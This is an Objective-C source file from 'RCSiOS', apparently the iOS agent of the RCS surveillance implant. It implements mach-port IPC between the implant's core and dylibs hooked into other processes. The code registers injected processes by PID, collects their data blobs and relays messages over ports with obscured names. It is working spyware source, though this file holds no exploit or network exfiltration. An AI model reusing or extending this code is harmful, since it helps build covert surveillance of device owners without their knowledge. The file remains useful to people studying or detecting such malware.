/*
 * RCSiOS - IPC through machport
 *
 * Created on 11/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 * Adapted from RCSMac by Massimo Chiodini on 05/03/2010
 *
 */

#include <unistd.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <mach/message.h>
#include <fcntl.h>

#import "RCSISharedMemory.h"
#import "RCSICommon.h"

//#define DEBUG_

#pragma mark -
#pragma mark Implementation
#pragma mark -

// notified by new hooked proc
typedef struct _shMemNewProc
{
#define NEWPROCMAGIC  0xFFFFFFFF
#define NEWPROCPORT   0xCEEFBEFF
  int magic;
  int pid;
} shMemNewProc;

static RCSISharedMemory *sharedRCSIIpc = nil;

#pragma mark -
#pragma mark Core callback
#pragma mark -

CFDataRef coreMessagesHandler(CFMessagePortRef local,
                              SInt32 msgid,
                              CFDataRef data,
                              void *info)
{
  CFStringRef       cfNewPort;
  CFMessagePortRef  new_port = NULL;
  
  // paranoid...
  if (data == NULL || info == NULL) 
    return NULL;
  
  CFRetain(data);
  
  RCSISharedMemory *self       = (RCSISharedMemory *)info;
  shMemNewProc     *procBytes  = (shMemNewProc *)CFDataGetBytePtr(data);

  if (msgid == NEWPROCMAGIC && 
      procBytes->magic == NEWPROCPORT) 
    { 
      cfNewPort = CFStringCreateWithFormat(kCFAllocatorDefault, 
                                           0, 
                                           CFSTR("%@_%d"), 
                                           [self mFilename], 
                                           procBytes->pid);
      
      new_port  = CFMessagePortCreateRemote(kCFAllocatorDefault, cfNewPort);
      
      if (new_port != NULL) 
        {
          // locked on new command processing by another thread...
          @synchronized(self)
            {
              // add to array of machport and sync
              [self addPort: new_port];
              [self writeAllIpcBlobsToPort: new_port];
            }
            
            CFRelease(new_port);
        }
      
      CFRelease(cfNewPort);
    }
  else 
    { 
      NSData *tmpData = [[NSData alloc] initWithBytes: CFDataGetBytePtr(data) 
                                               length: CFDataGetLength(data)];      
      @synchronized(self)
      {
        [self.mCoreMessageQueue addObject: tmpData];  
      }
      
      [tmpData release];
    }
  
  CFRelease(data);
  
  return NULL;
}

#pragma mark -
#pragma mark Dylib callback
#pragma mark -

CFDataRef dylibMessagesHandler(CFMessagePortRef local,
                               SInt32 msgid,
                               CFDataRef data,
                               void *info)
{ 
  if (data == NULL || info == NULL) 
    return NULL;
  
  CFRetain(data);
  
  RCSISharedMemory *self = (RCSISharedMemory *)info;
  
  blob_t *blob = (blob_t*) CFDataGetBytePtr(data);
  
  NSData *blbData = [NSData dataWithBytes: blob->blob length: blob->size];
  
  RCSIDylibBlob *blb = [[RCSIDylibBlob alloc] initWithType: blob->type 
                                                    status: blob->status 
                                                attributes: blob->attributes 
                                                      blob: blbData
                                                  configId: blob->configId];
  
  [self putBlob: blb];
  
  [blb release];
  
  CFRelease(data);
  
  return NULL;
}

@implementation RCSISharedMemory

@synthesize mFilename;
@synthesize mSharedMemory;
@synthesize mCoreMessageQueue;
@synthesize mLogMessageQueue;

#pragma mark -
#pragma mark Singleton methods
#pragma mark -

+ (RCSISharedMemory *)sharedInstance
{
  @synchronized(self)
  {
  if (sharedRCSIIpc == nil)
    {
      [[self alloc] init];
    }
  }
  
  return sharedRCSIIpc;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
  if (sharedRCSIIpc == nil)
    {
      sharedRCSIIpc = [super allocWithZone: aZone];
      return sharedRCSIIpc;
    }
  }
  
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
  {
    if (sharedRCSIIpc != nil)
      {
        self = [super init];
        
        if (self != nil)
          {
            mRemotePorts      = [[NSMutableArray alloc] initWithCapacity: 0];
            mCoreMessageQueue = [[NSMutableArray alloc] initWithCapacity: 0];
            mDylibBlobQueue   = [[NSMutableArray alloc] initWithCapacity: 0];
            mSharedMemory     = NULL;
            mMemPort          = NULL;
            mRLSource         = NULL;
            mDylibBlobCount   = 0;
            mFilename         = @"kj489y92";
          }
        
        sharedRCSIIpc = self;
      }
  }
  
  return sharedRCSIIpc;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  return UINT_MAX;
}

- (oneway void)release
{

}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark MachPort methods
#pragma mark -

- (void)synchronizeRemotePort:(CFMessagePortRef)port
                    withMsgId:(SInt32)aMsgId
                      andData:(NSData *)aData
{
  CFDataRef retData   = NULL;
  SInt32 sndRet;
  
  if (port == NULL)
    return;
  
  sndRet = CFMessagePortSendRequest(port, 
                                    aMsgId, 
                                    (CFDataRef)aData, 
                                    0.5, 
                                    0.5, 
                                    kCFRunLoopDefaultMode, 
                                    &retData);
}

- (BOOL)synchronizeRemotePorts:(NSData *)data 
{
  CFMessagePortRef  tmp_port;
  int               i = 0;
  BOOL              bRet = NO;
  
  for (i=0; i < [mRemotePorts count]; i++)
    {
      tmp_port = (CFMessagePortRef) [mRemotePorts objectAtIndex: i];
    
      // cleaning
      if (CFMessagePortIsValid(tmp_port) == false)
        {
          CFMessagePortInvalidate(tmp_port);
          [mRemotePorts removeObjectAtIndex: i];
          continue;
        }
    
      [self synchronizeRemotePort:tmp_port
                        withMsgId:0
                          andData:data];
      bRet = YES;
    }
  
  return bRet;
}

- (BOOL)writeIpcBlob:(NSData*)aData
{
  [self synchronizeRemotePorts: aData];
  return TRUE;
}

- (BOOL)writeAllIpcBlobsToPort:(CFMessagePortRef)aPort
{
  for (int i=0; i < [mDylibBlobQueue count]; i++) 
    {
      id blob = [mDylibBlobQueue objectAtIndex:i];
      [self synchronizeRemotePort:aPort withMsgId:0 andData: [blob blob]];
    }
  return TRUE;
}

- (void)refreshRemoteBlobsToPid:(int)aPid
{
  CFStringRef cfNewPort = 
    CFStringCreateWithFormat(kCFAllocatorDefault, 
                             0, 
                             CFSTR("%@_%d"), 
                             [self mFilename], 
                             aPid);
  
  CFMessagePortRef new_port  = 
    CFMessagePortCreateRemote(kCFAllocatorDefault, cfNewPort);
  
  CFRelease(cfNewPort);
  
  if (new_port != NULL) 
    {
      [self writeAllIpcBlobsToPort: new_port];
      CFRelease(new_port);
    }
}

#pragma mark -
#pragma mark Dylib IPC methods
#pragma mark -

- (void)addPort: (CFMessagePortRef)port
{
  [mRemotePorts addObject: (id)port];
}

- (void)delBlobs
{
  @synchronized(self)
  {
    [mDylibBlobQueue removeAllObjects];
  }
}
- (id)getBlobs
{
  NSMutableArray *blobs = nil;
 
  @synchronized(self)
  {
    if (mDylibBlobCount > 0)
      {
        blobs = [[[NSMutableArray alloc] initWithCapacity:0] autorelease];
      
        int count = [mDylibBlobQueue count];
        
        for (int i=count-1; i >= 0; i--) 
          {
            RCSIDylibBlob *blb = [mDylibBlobQueue objectAtIndex: i];
            
            if ([blb status] == 1)
              {
                [blobs addObject: blb];
                [blb setStatus: 0];
                mDylibBlobCount--;
              }
          }
      }
  }
  
  return blobs;
}

- (id)getBlob
{
  RCSIDylibBlob *retBlb = nil;
  
  @synchronized(self)
  {
    if (mDylibBlobCount > 0)
      {
        int count = [mDylibBlobQueue count];
      
        for (int i=count-1; i >= 0; i--) 
          {
            RCSIDylibBlob *blb = [mDylibBlobQueue objectAtIndex: i];
          
            if ([blb status] == 1)
              {
                retBlb = blb;
                [retBlb setStatus: 0];
                mDylibBlobCount--;
                break;
              }
          }
      }
  }
  
  return retBlb;
}

- (void)putBlob:(RCSIDylibBlob*)aBlob
{
  BOOL found = FALSE;
  
  @synchronized(self)
  {
    for(int i=0; i < [mDylibBlobQueue count]; i++)
      {
        RCSIDylibBlob *currBlob = [mDylibBlobQueue objectAtIndex:i];
      
        if ([currBlob type] == [aBlob type])
          {
            if ([aBlob configId] >= [currBlob configId]) 
              {
                [currBlob setStatus: [aBlob status]];
                [currBlob setAttributes: [aBlob attributes]];
                [currBlob setTimestamp: [aBlob timestamp]];
                [currBlob setConfigId: [aBlob configId]];
                [currBlob setBlob: [aBlob blob]];
                mDylibBlobCount++;
              }
            found = TRUE;
            break;
          }
      }
  
    if (found == FALSE)
      {
        [mDylibBlobQueue addObject: aBlob];
        mDylibBlobCount++;
      }
  }
}

- (BOOL)syncDylibLocalPort
{
  shMemNewProc memProc;
  int maxRetry = 0;
  
  do 
    {
      mCorePort = CFMessagePortCreateRemote(kCFAllocatorDefault, 
                                            (CFStringRef)SH_LOG_FILENAME);
      if (mCorePort == NULL) 
          sleep(1);
    } 
  while(mCorePort == NULL && maxRetry++ < 60);
  
  if (mCorePort != NULL)
    {
      memProc.magic = NEWPROCPORT;
      memProc.pid   = getpid();
      
      NSData *dataProc = [[NSData alloc] initWithBytes: &memProc 
                                                length: sizeof(memProc)];
      
      [self synchronizeRemotePort: mCorePort 
                        withMsgId: NEWPROCMAGIC 
                          andData: dataProc];
      
      [dataProc release];
      
      // Add to permit the use with writeIpcBlob
      [self addPort:mCorePort];
    
      return TRUE;
    }
  else
    return FALSE;
}

- (int)createDylibRLSource
{
  Boolean               bfool = false;
  CFMessagePortContext  shCtx;
  NSString              *shFileName;
  
  memset(&shCtx, 0, sizeof(shCtx));
  shCtx.info = (void *)self;
  
  shFileName = [[NSString alloc] initWithFormat: @"%@_%d", mFilename, getpid()];
  
  mDylibPort = CFMessagePortCreateLocal(kCFAllocatorDefault,  
                                      (CFStringRef)shFileName, 
                                      dylibMessagesHandler, 
                                      &shCtx, 
                                      &bfool);
  
  if (mDylibPort == NULL) 
    return kRCS_ERROR;
  
  mRLSource = CFMessagePortCreateRunLoopSource(kCFAllocatorDefault, mDylibPort, 0);
  
  CFRunLoopAddSource(CFRunLoopGetCurrent(), mRLSource, kCFRunLoopDefaultMode);
  
  [shFileName release];
  
  if ([self syncDylibLocalPort] == FALSE)
    return kRCS_ERROR;
  
  return kRCS_SUCCESS;
}

#pragma mark -
#pragma mark Core IPC methods
#pragma mark -

- (int)createCoreRLSource
{
  Boolean bfool = false;
  CFMessagePortContext shCtx;
  
  memset(&shCtx, 0, sizeof(shCtx));  
  shCtx.info = (void *)self;
  
  mMemPort = CFMessagePortCreateLocal(kCFAllocatorDefault, 
                                      (CFStringRef)SH_LOG_FILENAME, 
                                      coreMessagesHandler, 
                                      &shCtx, 
                                      &bfool);
  
  if (mMemPort == NULL) 
    {
      return kRCS_ERROR;
    }
  
  mRLSource = CFMessagePortCreateRunLoopSource(kCFAllocatorDefault, mMemPort, 0);
  
  CFRunLoopAddSource(CFRunLoopGetCurrent(), mRLSource, kCFRunLoopDefaultMode);

  return kRCS_SUCCESS;
}

- (NSMutableArray*)fetchMessages
{
  NSMutableArray *tmpQueue;
  
  @synchronized(self)
  {
    tmpQueue = [[mCoreMessageQueue copy] autorelease];
    [mCoreMessageQueue removeAllObjects];
  }
  
  return tmpQueue;
}

#pragma mark -
#pragma mark Internal message handling
#pragma mark -

typedef struct _coreMessage_t
{
  mach_msg_header_t header;
  uint dataLen;
} coreMessage_t;

+ (BOOL)sendMessageToMachPort:(mach_port_t)port 
                     withData:(NSData *)aData
{
  coreMessage_t *message;
  kern_return_t err;
  uint theMsgLen = (sizeof(coreMessage_t) + [aData length]);
  
  // released by handleMachMessage
  NSMutableData *theMsg = [[NSMutableData alloc] 
                           initWithCapacity: theMsgLen];
  
  message = (coreMessage_t*) [theMsg bytes];
  message->header.msgh_bits = MACH_MSGH_BITS_REMOTE(MACH_MSG_TYPE_MAKE_SEND);
  message->header.msgh_local_port = MACH_PORT_NULL;
  message->header.msgh_remote_port = port;
  message->header.msgh_size = theMsgLen;
  message->dataLen = [aData length];
  
  memcpy((u_char*)message + sizeof(coreMessage_t), [aData bytes], message->dataLen);
  
  err = mach_msg((mach_msg_header_t*)message, 
                 MACH_SEND_MSG, 
                 theMsgLen, 
                 0, 
                 MACH_PORT_NULL, 
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  
  [theMsg release];
  
  if( err != KERN_SUCCESS )
    {
      return FALSE;
    }
  
  return TRUE;
}

+ (BOOL)sendMessageToCoreMachPort:(NSData*)aData 
                         withMode:(NSString*)aMode
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  CFStringRef corePortName = CFSTR("78shfu");
  
  CFMessagePortRef corePort = CFMessagePortCreateRemote(kCFAllocatorDefault, corePortName);
  
  CFDataRef retData   = NULL;
  SInt32 sndRet;
  
  sndRet = CFMessagePortSendRequest(corePort, 
                                    0, 
                                    (CFDataRef)aData, 
                                    0.5, 
                                    0.5, 
                                    /*(CFStringRef)aMode*/ NULL, 
                                    &retData);
   
  CFRelease(corePort);
  
  [pool release];
  
  return TRUE;
}

@end